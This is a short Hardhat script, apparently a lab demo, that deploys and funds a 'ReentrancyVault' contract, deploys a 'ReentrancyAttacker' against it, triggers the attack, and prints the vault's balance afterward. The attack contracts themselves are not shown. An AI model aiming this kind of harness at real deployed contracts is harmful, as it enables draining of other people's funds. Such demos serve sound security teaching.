const { ethers } = require("hardhat");
async function main(){
  const [deployer] = await ethers.getSigners();
  const Vault = await ethers.getContractFactory("ReentrancyVault");
  const vault = await Vault.deploy(); await vault.deployed();
  // seed vault
  await deployer.sendTransaction({to: vault.address, value: ethers.utils.parseEther("10")});

  const Att = await ethers.getContractFactory("ReentrancyAttacker");
  const att = await Att.deploy(vault.address); await att.deployed();

  const tx = await att.attack({value: ethers.utils.parseEther("1")});
  await tx.wait();
  console.log("Vault balance after:", await ethers.provider.getBalance(vault.address));
}
main().catch(console.error);
